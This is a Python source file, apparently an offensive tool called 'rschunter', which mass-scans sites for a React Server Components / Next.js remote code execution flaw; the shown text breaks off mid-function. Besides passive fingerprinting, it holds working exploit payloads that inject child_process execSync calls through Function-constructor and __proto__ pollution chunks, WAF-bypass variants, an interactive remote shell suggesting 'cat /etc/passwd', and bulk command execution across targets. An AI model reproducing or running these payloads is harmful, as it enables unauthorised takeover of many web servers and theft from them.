#!/usr/bin/env python3
"""
RSC Mass Vulnerability Scanner
A high-performance tool for scanning multiple URLs for RSC vulnerabilities.

Features:
- Mass scanning with concurrent processing
- Resumable/pauseable scans with state management
- Smart URL parsing and normalization
- Beautiful console output with color coding
- Progress tracking and summary reports
- Comprehensive error handling
- Command execution on vulnerable targets
- Automatic reporting to file

Usage: 
    python3 rschunter.py <input_file> [options]
    python3 rschunter.py --url https://example.com [options]
    python3 rschunter.py --url https://example.com -sh
    python3 rschunter.py targets.txt -sh --threads 20
    python3 rschunter.py targets.txt -exec "echo Vulnerable: {}" --threads 20
    python3 rschunter.py --resume scan_state.json
"""

import sys
import json
import re
import signal
import time
import argparse
import subprocess
import shlex
import cmd
from pathlib import Path
from urllib.parse import urlparse, urljoin
from typing import Dict, List, Tuple, Optional, Set
from dataclasses import dataclass, asdict
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("Error: 'requests' library not found.")
    print("Install it with: pip3 install requests")
    sys.exit(1)

import random
import string


# Unicode fallback symbols for Windows compatibility
def _get_unicode_char(char: str, fallback: str) -> str:
    """Get Unicode character with fallback for Windows"""
    try:
        char.encode(sys.stdout.encoding or 'utf-8')
        return char
    except (UnicodeEncodeError, AttributeError):
        return fallback

# Define emoji/symbol constants with fallbacks
EMOJI_SHIELD = _get_unicode_char("🔍", "[*]")
EMOJI_CHART = _get_unicode_char("📊", "[STATS]")
EMOJI_CHECK = _get_unicode_char("✅", "[OK]")
EMOJI_PENDING = _get_unicode_char("⏳", "[...]")
EMOJI_THREAD = _get_unicode_char("🧵", "[T]")
EMOJI_LIGHTNING = _get_unicode_char("⚡", "[>>]")
EMOJI_WARN = _get_unicode_char("⚠", "[!]")
EMOJI_PAUSE = _get_unicode_char("⏸", "[||]")
EMOJI_WARN_EMOJI = _get_unicode_char("⚠️", "[!]")
EMOJI_FILE = _get_unicode_char("📄", "[FILE]")
EMOJI_GREEN_CHECK = _get_unicode_char("✓", "[+]")


# Color codes for terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    
    @staticmethod
    def disable():
        """Disable colors for non-TTY environments"""
        Colors.RED = ''
        Colors.GREEN = ''
        Colors.YELLOW = ''
        Colors.BLUE = ''
        Colors.MAGENTA = ''
        Colors.CYAN = ''
        Colors.WHITE = ''
        Colors.BOLD = ''
        Colors.UNDERLINE = ''
        Colors.RESET = ''


# Utility Functions for Advanced Features
def generate_junk_data(size_kb: int = 128) -> Tuple[str, str]:
    """Generate random junk data for WAF bypass"""
    param_name = ''.join(random.choices(string.ascii_lowercase, k=12))
    junk = ''.join(random.choices(string.ascii_letters + string.digits, k=size_kb * 1024))
    return param_name, junk


def resolve_redirects(url: str, session: requests.Session, timeout: int = 10, max_redirects: int = 10) -> str:
    """Follow same-host redirects only, return final URL"""
    current_url = url
    original_host = urlparse(url).netloc
    
    for _ in range(max_redirects):
        try:
            response = session.head(
                current_url,
                timeout=timeout,
                allow_redirects=False
            )
            
            if response.status_code in (301, 302, 303, 307, 308):
                location = response.headers.get('Location')
                if location:
                    if location.startswith('/'):
                        # Relative redirect - same host
                        parsed = urlparse(current_url)
                        current_url = f"{parsed.scheme}://{parsed.netloc}{location}"
                    else:
                        # Absolute redirect - check if same host
                        new_host = urlparse(location).netloc
                        if new_host == original_host:
                            current_url = location
                        else:
                            # Different host, stop following
                            break
                else:
                    break
            else:
                break
        except Exception:
            break
    
    return current_url


def is_mitigated_host(response: requests.Response) -> bool:
    """Check if host has Vercel/Netlify mitigations in place"""
    server_header = response.headers.get('Server', '').lower()
    has_netlify_vary = 'Netlify-Vary' in response.headers
    
    return (
        has_netlify_vary or
        server_header == 'netlify' or
        server_header == 'vercel'
    )


@dataclass
class ScanResult:
    """Data class for storing scan results"""
    url: str
    vulnerable: bool
    passiveDetected: bool
    activeDetected: bool
    endpointVulnerable: bool
    details: List[str]
    timestamp: str
    error: Optional[str] = None
    execOutput: Optional[str] = None


class UrlParser:
    """Smart URL parser that handles various input formats"""
    
    @staticmethod
    def normalizeUrl(rawInput: str) -> Optional[str]:
        """
        Normalize and validate URL from various input formats.
        """
        if not rawInput or not rawInput.strip():
            return None
        
        rawInput = rawInput.strip()
        
        # Remove trailing slashes
        rawInput = rawInput.rstrip('/')
        
        # Check if it already has a scheme
        if rawInput.startswith(('http://', 'https://')):
            url = rawInput
        else:
            # Try with https first
            url = f'https://{rawInput}'
        
        try:
            parsed = urlparse(url)
            
            # Validate scheme
            if parsed.scheme not in ('http', 'https'):
                return None
            
            # Validate hostname
            if not parsed.netloc:
                return None
            
            # Basic hostname validation (allow domains, IPs, localhost)
            hostname = parsed.netloc.split(':')[0]
            if not hostname:
                return None
            
            # Reconstruct clean URL
            cleanUrl = f"{parsed.scheme}://{parsed.netloc}"
            if parsed.path and parsed.path != '/':
                cleanUrl += parsed.path
            if parsed.query:
                cleanUrl += f'?{parsed.query}'
            
            return cleanUrl
            
        except Exception:
            return None
    
    @staticmethod
    def extractDomain(url: str) -> str:
        """Extract domain from URL for display purposes"""
        try:
            parsed = urlparse(url)
            return parsed.netloc
        except Exception:
            return url


class ScanStateManager:
    """Manages scan state for resume/pause functionality"""
    
    def __init__(self, stateFile: str = 'scan_state.json'):
        self.stateFile = Path(stateFile)
        self.lock = threading.Lock()
    
    def saveState(self, targets: List[str], completed: Set[str], 
                   results: List[ScanResult], scanId: str):
        """Save current scan state to file"""
        with self.lock:
            state = {
                'scanId': scanId,
                'timestamp': datetime.now().isoformat(),
                'targets': targets,
                'completed': list(completed),
                'results': [asdict(r) for r in results],
                'total': len(targets),
                'scanned': len(completed)
            }
            
            with open(self.stateFile, 'w') as f:
                json.dump(state, f, indent=2)
    
    def loadState(self) -> Optional[Dict]:
        """Load scan state from file"""
        if not self.stateFile.exists():
            return None
        
        try:
            with open(self.stateFile, 'r') as f:
                return json.load(f)
        except Exception as e:
            print(f"{Colors.RED}Error loading state: {e}{Colors.RESET}")
            return None
    
    def clearState(self):
        """Clear saved state"""
        if self.stateFile.exists():
            self.stateFile.unlink()


class RscScanner:
    """High-performance RSC vulnerability scanner"""
    
    def __init__(self, timeout: int = 10, maxWorkers: int = 10, wafBypass: bool = False, 
                 wafBypassSize: int = 128, windowsMode: bool = False, vercelWafBypass: bool = False,
                 followRedirects: bool = True):
        self.timeout = timeout
        self.maxWorkers = maxWorkers
        self.wafBypass = wafBypass
        self.wafBypassSize = wafBypassSize
        self.windowsMode = windowsMode
        self.vercelWafBypass = vercelWafBypass
        self.followRedirects = followRedirects
        self.session = self._createSession()
        
    def _createSession(self) -> requests.Session:
        """Create a session with retry logic and connection pooling"""
        session = requests.Session()
        
        # Configure retries
        retryStrategy = Retry(
            total=2,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        
        adapter = HTTPAdapter(
            max_retries=retryStrategy,
            pool_connections=self.maxWorkers,
            pool_maxsize=self.maxWorkers * 2
        )
        
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        return session
    
    def scanUrl(self, url: str) -> ScanResult:
        """Scan a single URL for RSC vulnerabilities"""
        details = []
        passiveDetected = False
        activeDetected = False
        endpointVulnerable = False
        error = None
        finalUrl = url
        
        try:
            # Follow redirects if enabled
            if self.followRedirects:
                finalUrl = resolve_redirects(url, self.session, self.timeout)
                if finalUrl != url:
                    details.append(f"Followed redirect: {url} -> {finalUrl}")
                    url = finalUrl
            
            # Passive scan
            passiveDetected, passiveDetails = self._passiveScan(url)
            details.extend(passiveDetails)
            
            # Active fingerprint
            activeDetected, activeDetails = self._activeFingerprint(url)
            details.extend(activeDetails)
            
            # Endpoint check (only if other methods detected something)
            if passiveDetected or activeDetected:
                endpointVulnerable, endpointDetails = self._checkEndpoints(url)
                details.extend(endpointDetails)
            
        except requests.Timeout:
            error = "Timeout"
        except requests.ConnectionError:
            error = "Connection failed"
        except Exception as e:
            error = str(e)[:50]
        
        vulnerable = (passiveDetected or activeDetected or endpointVulnerable) and not error
        
        return ScanResult(
            url=finalUrl,
            vulnerable=vulnerable,
            passiveDetected=passiveDetected,
            activeDetected=activeDetected,
            endpointVulnerable=endpointVulnerable,
            details=details,
            timestamp=datetime.now().isoformat(),
            error=error
        )
    
    def _passiveScan(self, url: str) -> Tuple[bool, List[str]]:
        """Passive detection with enhanced RSC fingerprinting"""
        details = []
        score = 0
        
        try:
            response = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            contentType = response.headers.get('Content-Type', '')
            html = response.text[:100000]  # Limit to first 100KB for performance
            headers = response.headers
            
            # CRITICAL: X-Action-Redirect header check (definitive RCE proof)
            xActionRedirect = headers.get('X-Action-Redirect', '')
            if re.search(r'.*/login\?a=11111.*', xActionRedirect):
                score += 100
                details.append(f"X-Action-Redirect RCE proof: {xActionRedirect} (CRITICAL)")
            
            # Primary indicators (high confidence)
            if 'text/x-component' in contentType:
                score += 100
                details.append("Content-Type: text/x-component")
            
            if re.search(r'(window|self)\.__next_f\s*=', html):
                score += 80
                details.append("window.__next_f detected")
            
            # React Server Components patterns
            if 'react-server-dom-webpack' in html:
                score += 30
                details.append("react-server-dom-webpack found")
            
            # Next.js RSC chunk patterns (flight protocol markers)
            if re.search(r'\d+:["\w]+', html) and ('self.__next' in html or 'window.__next' in html):
                score += 40
                details.append("Next.js RSC chunk pattern")
            
            # __NEXT_DATA__ fingerprint (reliable Next.js indicator)
            if '__NEXT_DATA__' in html:
                score += 25
                details.append("__NEXT_DATA__ runtime marker")
            
            # Shodan-identified headers (narrowed attack surface indicators)
            # x-nextjs-prerender presence indicates prerendering capability
            if headers.get('x-nextjs-prerender'):
                score += 30
                details.append(f"x-nextjs-prerender: {headers.get('x-nextjs-prerender')}")
            
            # x-nextjs-stale-time indicates ISR (Incremental Static Regeneration)
            if headers.get('x-nextjs-stale-time'):
                score += 25
                details.append(f"x-nextjs-stale-time: {headers.get('x-nextjs-stale-time')}")
            
            # x-middleware-rewrite is critical for exploit conditions
            if headers.get('x-middleware-rewrite'):
                score += 40
                details.append(f"x-middleware-rewrite detected (critical)")
            
            # x-middleware-subrequest vulnerability indicator
            if headers.get('x-middleware-subrequest'):
                score += 50
                details.append("x-middleware-subrequest header present (exploit condition)")
            
            # Vary header with RSC-related values (from Reddit research)
            varyHeader = headers.get('Vary', '').lower()
            if 'rsc' in varyHeader:
                score += 35
                details.append("Vary: RSC header (React Server Components)")
            if 'next-router-state-tree' in varyHeader:
                score += 30
                details.append("Vary: Next-Router-State-Tree (App Router)")
            if 'next-router-prefetch' in varyHeader:
                score += 20
                details.append("Vary: Next-Router-Prefetch")
            
            # Server action indicators
            if 'Next-Action' in str(response.headers) or re.search(r'["\']Next-Action["\']', html):
                score += 35
                details.append("Next-Action header support")
            
            # Build manifest files (Next.js specific)
            if re.search(r'/_next/(static|data)/', html):
                score += 25
                details.append("Next.js build artifacts")
            
            # Flight data patterns in HTML
            if re.search(r'"\$L\d+"', html) or re.search(r'"\$@\d+"', html):
                score += 45
                details.append("Flight protocol references")
            
            # Server Components payload structure
            if re.search(r'{"then":\s*"\$\w+', html):
                score += 50
                details.append("RSC payload structure")
            
            # Next.js version header (informational)
            xNextVersion = response.headers.get('x-powered-by', '')
            if 'Next.js' in xNextVersion:
                score += 20
                details.append(f"Next.js version: {xNextVersion}")
            # Next.js version header (informational)
            xNextVersion = response.headers.get('x-powered-by', '')
            if 'Next.js' in xNextVersion:
                score += 20
                details.append(f"Next.js version: {xNextVersion}")
            
            return score >= 50, details
            
        except Exception:
            return False, []
    
    def _activeFingerprint(self, url: str) -> Tuple[bool, List[str]]:
        """Active fingerprinting with enhanced RSC header checks"""
        details = []
        
        try:
            # Primary RSC header test
            response = self.session.get(
                url,
                headers={'RSC': '1'},
                timeout=self.timeout,
                allow_redirects=True
            )
            
            contentType = response.headers.get('Content-Type', '')
            varyHeader = response.headers.get('Vary', '')
            body = response.text[:1000]  # Check first 1KB
            
            if 'text/x-component' in contentType:
                details.append("RSC Content-Type response")
            
            if 'RSC' in varyHeader:
                details.append("Vary: RSC header")
            
            # React Flight Protocol format detection
            if re.match(r'^\d+:["IHL]', body.strip()):
                details.append("React Flight Protocol")
            
            # Test Next.js data endpoint with RSC header
            dataEndpoint = urljoin(url, '/_next/data')
            try:
                dataResp = self.session.get(
                    dataEndpoint,
                    headers={'RSC': '1'},
                    timeout=5
                )
                if dataResp.status_code != 404:
                    details.append("_next/data endpoint accessible")
            except Exception:
                pass
            
            # Check for Next.js build manifest
            try:
                manifestResp = self.session.get(
                    urljoin(url, '/_next/static/chunks/webpack.js'),
                    timeout=5
                )
                if manifestResp.status_code == 200:
                    details.append("Next.js webpack chunks present")
            except Exception:
                pass
            
            return len(details) > 0, details
            
        except Exception:
            return False, []
    
    def _checkEndpoints(self, url: str) -> Tuple[bool, List[str]]:
        """Check for vulnerable endpoints with error-based detection"""
        details = []
        
        # Common Next.js server action endpoints
        testPaths = [
            '/_next/data',
            '/spectre-ghost',
            '/api/actions',
            '/',  # Root can also handle server actions
        ]
        
        for path in testPaths:
            try:
                testUrl = urljoin(url, path)
                
                # Test 1: Basic Next-Action header acceptance
                response = self.session.post(
                    testUrl,
                    headers={
                        'Next-Action': 'test',
                        'Content-Type': 'multipart/form-data',
                    },
                    timeout=5
                )
                
                # Vulnerable if not 404 and shows RSC-related responses
                if response.status_code != 404:
                    responseText = response.text.lower()
                    
                    # Check for RSC-specific error messages or behaviors
                    if any(marker in responseText for marker in [
                        'digest',
                        'next-action',
                        'react',
                        'chunk',
                        'server function',
                        '__proto__',
                        'next_redirect',
                    ]):
                        details.append(f"Vulnerable endpoint: {path}")
                        return True, details
                    
                    # Even without specific markers, non-404 is suspicious
                    if response.status_code in [200, 500]:
                        details.append(f"Suspicious endpoint: {path} (HTTP {response.status_code})")
                
                # Test 2: Benign React Flight probe (REACT2SHELL_PROBE marker)
                # Passive detection without executing commands
                probePayload = {
                    'then': '$1:__proto__:then',
                    'status': 'resolved_model',
                    'reason': -1,
                    'value': '{"then": "$B0"}',
                    '_response': {
                        '_prefix': "throw Object.assign(new Error('NEXT_REDIRECT'), {digest:'REACT2SHELL_PROBE'});",
                        '_formData': {
                            'get': '$1:constructor:constructor',
                        },
                    },
                }
                
                probeFiles = {
                    '0': (None, json.dumps(probePayload)),
                    '1': (None, '"$@0"'),
                }
                
                errorResp = self.session.post(
                    testUrl,
                    files=probeFiles,
                    headers={'Next-Action': 'x'},
                    timeout=5
                )
                
                # Check for Vercel/Netlify mitigations (filter false positives)
                if is_mitigated_host(errorResp):
                    details.append(f"{path} - Mitigated (Vercel/Netlify protection)")
                    continue
                
                # Check if benign probe returned the REACT2SHELL_PROBE marker
                if 'REACT2SHELL_PROBE' in errorResp.text:
                    details.append(f"REACT2SHELL_PROBE confirmed on {path} (high confidence vulnerability)")
                    return True, details
                
                errorText = errorResp.text.lower()
                
                # Look for React/Next.js specific error patterns
                if any(pattern in errorText for pattern in [
                    'syntaxerror',
                    'unexpected token',
                    'function',
                    'native code',
                    'react',
                    'chunk',
                ]):
                    details.append(f"Error-based detection: {path}")
                    return True, details
                        
            except Exception:
                continue
        
        return False, details


class InteractiveShell(cmd.Cmd):
    """Interactive shell for executing commands on vulnerable target(s)"""
    
    intro = f"""
{Colors.CYAN}{'='*70}
{Colors.BOLD}🐚 RSC Interactive Shell{Colors.RESET}
{Colors.CYAN}{'='*70}{Colors.RESET}

Type commands to execute on vulnerable target(s).
Special commands:
  help, ?       - Show this help
  exit, quit    - Exit the shell
  info          - Show current target information
  targets       - List all vulnerable targets
  switch <id>   - Switch to target by ID
  refresh       - Refresh vulnerable targets list
  
Examples:
  whoami
  ls -la
  cat /etc/passwd
  pwd && id

{Colors.YELLOW}Press Ctrl+D or type 'exit' to quit{Colors.RESET}
    """
    
    prompt = f"{Colors.RED}rsc-shell>{Colors.RESET} "
    
    def __init__(self, target: str, scanner, vulnerableTargets: List[str] = None, massMode: bool = False):
        super().__init__()
        self.target = target
        self.scanner = scanner
        self.domain = UrlParser.extractDomain(target)
        self.vulnerableTargets = vulnerableTargets or [target]
        self.massMode = massMode
        self.targetIndex = 0
        self.lock = threading.Lock()
        
        # Update prompt with target info
        self._updatePrompt()
    
    def _updatePrompt(self):
        """Update prompt with current target info"""
        shortDomain = self.domain[:30] + '...' if len(self.domain) > 30 else self.domain
        if self.massMode and len(self.vulnerableTargets) > 1:
            self.prompt = f"{Colors.RED}rsc[{self.targetIndex + 1}/{len(self.vulnerableTargets)}|{shortDomain}]>{Colors.RESET} "
        else:
            self.prompt = f"{Colors.RED}rsc[{shortDomain}]>{Colors.RESET} "
    
    def addVulnerableTarget(self, url: str):
        """Add newly discovered vulnerable target (thread-safe)"""
        with self.lock:
            if url not in self.vulnerableTargets:
                self.vulnerableTargets.append(url)
                if self.massMode:
                    print(f"\r{Colors.GREEN}[+] New vulnerable target #{len(self.vulnerableTargets)}: {UrlParser.extractDomain(url)}{Colors.RESET}")
                    print(self.prompt, end='', flush=True)
    
    def default(self, line):
        """Execute arbitrary command on target"""
        if not line.strip():
            return
        
        print(f"{Colors.YELLOW}[*] Executing on {self.domain}: {line}{Colors.RESET}")
        
        try:
            result = self.scanner.executeRemoteCommand(self.target, line)
            if result:
                print(f"{Colors.GREEN}{result}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[!] No response or command failed{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
    
    def do_info(self, arg):
        """Show current target information"""
        print(f"{Colors.CYAN}Current Target: {Colors.BOLD}{self.target}{Colors.RESET}")
        print(f"{Colors.CYAN}Domain: {Colors.BOLD}{self.domain}{Colors.RESET}")
        if self.massMode:
            print(f"{Colors.CYAN}Position: {Colors.BOLD}{self.targetIndex + 1}/{len(self.vulnerableTargets)}{Colors.RESET}")
    
    def do_targets(self, arg):
        """List all vulnerable targets"""
        with self.lock:
            if not self.vulnerableTargets:
                print(f"{Colors.YELLOW}No vulnerable targets found yet.{Colors.RESET}")
                return
            
            print(f"\n{Colors.BOLD}{Colors.CYAN}Vulnerable Targets ({len(self.vulnerableTargets)}):{Colors.RESET}")
            print(f"{Colors.CYAN}{'-'*70}{Colors.RESET}")
            for idx, url in enumerate(self.vulnerableTargets):
                marker = f"{Colors.GREEN}►{Colors.RESET}" if idx == self.targetIndex else " "
                domain = UrlParser.extractDomain(url)
                print(f"{marker} {Colors.BOLD}{idx + 1}.{Colors.RESET} {domain}")
                if len(url) > 50:
                    print(f"     {Colors.YELLOW}{url[:47]}...{Colors.RESET}")
            print()
    
    def do_switch(self, arg):
        """Switch to target by ID"""
        if not arg.strip():
            print(f"{Colors.YELLOW}Usage: switch <id>{Colors.RESET}")
            return
        
        try:
            targetId = int(arg.strip()) - 1
            with self.lock:
                if 0 <= targetId < len(self.vulnerableTargets):
                    self.targetIndex = targetId
                    self.target = self.vulnerableTargets[targetId]
                    self.domain = UrlParser.extractDomain(self.target)
                    self._updatePrompt()
                    print(f"{Colors.GREEN}[+] Switched to target #{targetId + 1}: {self.domain}{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[!] Invalid target ID. Use 'targets' to see available targets.{Colors.RESET}")
        except ValueError:
            print(f"{Colors.RED}[!] Invalid ID format. Use: switch <number>{Colors.RESET}")
    
    def do_refresh(self, arg):
        """Refresh vulnerable targets list"""
        with self.lock:
            count = len(self.vulnerableTargets)
        print(f"{Colors.GREEN}[+] Currently tracking {count} vulnerable target(s){Colors.RESET}")
    
    def do_exit(self, arg):
        """Exit the shell"""
        print(f"{Colors.YELLOW}Exiting shell...{Colors.RESET}")
        return True
    
    def do_quit(self, arg):
        """Exit the shell"""
        return self.do_exit(arg)
    
    def do_EOF(self, arg):
        """Handle Ctrl+D"""
        print()
        return self.do_exit(arg)


class MassScanner:
    """Main mass scanning coordinator"""
    
    def __init__(self, maxWorkers: int = 10, execCommand: str = None, wafBypass: bool = False,
                 wafBypassSize: int = 128, windowsMode: bool = False, vercelWafBypass: bool = False,
                 followRedirects: bool = True):
        self.scanner = RscScanner(
            maxWorkers=maxWorkers,
            wafBypass=wafBypass,
            wafBypassSize=wafBypassSize,
            windowsMode=windowsMode,
            vercelWafBypass=vercelWafBypass,
            followRedirects=followRedirects
        )
        self.stateManager = ScanStateManager()
        self.maxWorkers = maxWorkers
        self.execCommand = execCommand
        self.wafBypass = wafBypass
        self.wafBypassSize = wafBypassSize
        self.windowsMode = windowsMode
        self.vercelWafBypass = vercelWafBypass
        self.followRedirects = followRedirects
        self.paused = False
        self.stopScan = False
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self._signalHandler)
        signal.signal(signal.SIGTERM, self._signalHandler)
    
    def _signalHandler(self, signum, frame):
        """Handle Ctrl+C gracefully"""
        if not self.paused:
            print(f"\n\n{Colors.YELLOW}{EMOJI_PAUSE}  Pausing scan... Press Ctrl+C again to stop.{Colors.RESET}")
            self.paused = True
        else:
            print(f"\n{Colors.RED}🛑 Stopping scan...{Colors.RESET}")
            self.stopScan = True
    
    def loadTargets(self, inputFile: str) -> List[str]:
        """Load and parse targets from input file"""
        targets = []
        seen = set()
        
        try:
            with open(inputFile, 'r') as f:
                for lineNum, line in enumerate(f, 1):
                    line = line.strip()
                    
                    # Skip empty lines and comments
                    if not line or line.startswith('#'):
                        continue
                    
                    # Parse URL
                    normalized = UrlParser.normalizeUrl(line)
                    
                    if normalized:
                        if normalized not in seen:
                            targets.append(normalized)
                            seen.add(normalized)
                    else:
                        print(f"{Colors.YELLOW}{EMOJI_WARN} Line {lineNum}: Invalid URL '{line}'{Colors.RESET}")
            
            return targets
            
        except FileNotFoundError:
            print(f"{Colors.RED}Error: File '{inputFile}' not found{Colors.RESET}")
            sys.exit(1)
        except Exception as e:
            print(f"{Colors.RED}Error reading file: {e}{Colors.RESET}")
            sys.exit(1)
    
    def executeRemoteCommand(self, target: str, customCmd: str = None) -> str:
        """Execute arbitrary command on vulnerable target via CVE-2025-55182"""
        # Use custom command if provided, otherwise use configured execCommand
        cmdTemplate = customCmd if customCmd else self.execCommand
        
        if not cmdTemplate:
            return None
            
        try:
            # Replace placeholder with actual command (for execCommand mode)
            if customCmd:
                cmd = customCmd
            else:
                cmd = cmdTemplate.replace("{}", target)
            
            # Try primary exploit method first (original approach)
            result = self._exploitMethod1(target, cmd)
            if result and "NEXT_REDIRECT" not in result:
                return result
            
            # Fallback to alternative exploit (__proto__ pollution)
            result = self._exploitMethod2(target, cmd)
            if result:
                return result
            
            return None
            
        except Exception as e:
            return f"Exploit error: {str(e)}"
    
    def _exploitMethod1(self, target: str, cmd: str) -> Optional[str]:
        """Primary exploit using Function constructor injection"""
        try:
            print(f"{Colors.BLUE}[DEBUG] Method 1: Trying Function constructor exploit{Colors.RESET}")
            print(f"{Colors.BLUE}[DEBUG] Command: {cmd}{Colors.RESET}")
            
            # Payload to trigger RCE via Function constructor
            payload = {
                "1": 'I["$1:constructor:constructor"]',
                "2": f'I["{cmd}"]',
                "3": 'I["return process.mainModule.require(\'child_process\').execSync(arguments[0]).toString()"]',
                "4": 'I["$3($2)"]'
            }
            
            # Send the exploit request to common RSC endpoints
            endpoints = ['/_next/data', '/adfa', '/api/actions']
            
            for endpoint in endpoints:
                try:
                    exploitUrl = urljoin(target, endpoint)
                    print(f"{Colors.BLUE}[DEBUG] Trying endpoint: {exploitUrl}{Colors.RESET}")
                    
                    files = {
                        'rsc_payload': (None, json.dumps(payload), 'text/x-component')
                    }
                    
                    headers = {
                        'Next-Action': 'test',
                        'RSC': '1'
                    }
                    
                    response = self.scanner.session.post(
                        exploitUrl,
                        files=files,
                        headers=headers,
                        timeout=10
                    )
                    
                    print(f"{Colors.BLUE}[DEBUG] Response status: {response.status_code}{Colors.RESET}")
                    
                    if response.status_code == 200 and response.text:
                        # Return the actual response text
                        print(f"{Colors.GREEN}[DEBUG] Got response from endpoint!{Colors.RESET}")
                        return response.text[:500]  # Return first 500 chars
                        
                except Exception as e:
                    print(f"{Colors.YELLOW}[DEBUG] Endpoint error: {e}{Colors.RESET}")
                    continue
            
            print(f"{Colors.YELLOW}[DEBUG] Method 1 failed, will try Method 2{Colors.RESET}")
            return None
            
        except Exception as e:
            print(f"{Colors.RED}[DEBUG] Method 1 exception: {e}{Colors.RESET}")
            return None
    
    def _exploitMethod2(self, target: str, cmd: str) -> Optional[str]:
        """Alternative exploit using __proto__ pollution (based on sumanrox PoC)"""
        try:
            print(f"{Colors.BLUE}[DEBUG] Method 2: Trying __proto__ pollution exploit{Colors.RESET}")
            
            # Adjust command for Windows if needed
            if self.windowsMode:
                cmd = f'powershell -c "{cmd}"'
                print(f"{Colors.BLUE}[DEBUG] Windows mode: {cmd}{Colors.RESET}")
            
            # More reliable payload using prototype pollution
            # This captures command output via Error digest
            craftedChunk = {
                "then": "$1:__proto__:then",
                "status": "resolved_model",
                "reason": -1,
                "value": '{"then": "$B0"}',
                "_response": {
                    "_prefix": f"var res = process.mainModule.require('child_process').execSync('{cmd}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'),{{digest:`${{res}}`}});",
                    "_formData": {
                        "get": "$1:constructor:constructor",
                    },
                },
            }
            
            # Build multipart form data with optional WAF bypass
            if self.wafBypass:
                # Add junk data at the beginning
                param_name, junk_data = generate_junk_data(self.wafBypassSize)
                files = {
                    param_name: (None, junk_data),
                    "0": (None, json.dumps(craftedChunk)),
                    "1": (None, '"$@0"'),
                }
            elif self.vercelWafBypass:
                # Vercel-specific WAF bypass with alternative structure
                craftedChunk["_response"]["_formData"]["get"] = '$3:\\"$$:constructor:constructor'
                files = {
                    "0": (None, json.dumps(craftedChunk)),
                    "1": (None, '"$@0"'),
                    "2": (None, "[]"),
                    "3": (None, '{"\\"\u0024\u0024":{}}'),
                }
            else:
                files = {
                    "0": (None, json.dumps(craftedChunk)),
                    "1": (None, '"$@0"'),
                }
            
            headers = {"Next-Action": "x"}
            
            # Try the target directly and common endpoints
            testUrls = [target, urljoin(target, '/_next/data'), urljoin(target, '/adfa')]
            
            # Determine timeout based on WAF bypass mode
            timeout = 20 if self.wafBypass else 10
            
            for url in testUrls:
                try:
                    print(f"{Colors.BLUE}[DEBUG] Trying endpoint: {url}{Colors.RESET}")
                    
                    response = self.scanner.session.post(
                        url,
                        files=files,
                        headers=headers,
                        timeout=timeout
                    )
                    
                    print(f"{Colors.BLUE}[DEBUG] Response status: {response.status_code}{Colors.RESET}")
                    
                    # Extract output from digest field in error response
                    if "NEXT_REDIRECT" in response.text or "digest" in response.text:
                        print(f"{Colors.GREEN}[DEBUG] Found NEXT_REDIRECT or digest in response!{Colors.RESET}")
                        # Parse the digest field which contains command output
                        match = re.search(r'"digest":"([^"]+)"', response.text)
                        if match:
                            print(f"{Colors.GREEN}[DEBUG] Extracted digest: {match.group(1)[:100]}{Colors.RESET}")
                            return match.group(1)
                        # Sometimes it's in a different format
                        match = re.search(r'digest[^:]*:\s*([^,}\n]+)', response.text)
                        if match:
                            result = match.group(1).strip('"\'')
                            print(f"{Colors.GREEN}[DEBUG] Extracted digest (alt format): {result[:100]}{Colors.RESET}")
                            return result
                        # Return raw if we can't parse but know it worked
                        print(f"{Colors.YELLOW}[DEBUG] Couldn't parse digest, returning raw response{Colors.RESET}")
                        return response.text[:500]
                        
                except Exception as e:
                    print(f"{Colors.YELLOW}[DEBUG] Endpoint error: {e}{Colors.RESET}")
                    continue
            
            print(f"{Colors.YELLOW}[DEBUG] Method 2 failed on all endpoints{Colors.RESET}")
            return None
            
        except Exception as e:
            print(f"{Colors.RED}[DEBUG] Method 2 exception: {e}{Colors.RESET}")
            return None

    def scanTargets(self, targets: List[str], resume: bool = False, liveShell = None) -> List[ScanResult]:
        """Scan multiple targets with concurrent processing"""
        
        scanId = datetime.now().strftime("%Y%m%d_%H%M%S")
        completed = set()
        results = []
        
        # Resume from previous state if requested
        if resume:
            state = self.stateManager.loadState()
            if state:
                print(f"{Colors.CYAN}📂 Resuming scan from {state['timestamp']}{Colors.RESET}")
                completed = set(state['completed'])
                results = [ScanResult(**r) for r in state['results']]
                scanId = state['scanId']
        
        # Filter out already completed targets
        pending = [t for t in targets if t not in completed]
        total = len(targets)
        
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}{EMOJI_SHIELD} RSC Mass Vulnerability Scanner{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*70}{Colors.RESET}")
        print(f"{EMOJI_CHART} Total targets: {Colors.BOLD}{total}{Colors.RESET}")
        print(f"{EMOJI_CHECK} Already scanned: {Colors.GREEN}{len(completed)}{Colors.RESET}")
        print(f"{EMOJI_PENDING} Pending: {Colors.YELLOW}{len(pending)}{Colors.RESET}")
        print(f"{EMOJI_THREAD} Workers: {Colors.BOLD}{self.maxWorkers}{Colors.RESET}")
        if self.execCommand:
            print(f"{EMOJI_LIGHTNING} Exec: {Colors.MAGENTA}{self.execCommand}{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*70}{Colors.RESET}\n")
        
        if not pending:
            print(f"{Colors.GREEN}{EMOJI_GREEN_CHECK} All targets already scanned!{Colors.RESET}\n")
            return results
        
        # Scan with progress tracking
        startTime = time.time()
        
        with ThreadPoolExecutor(max_workers=self.maxWorkers) as executor:
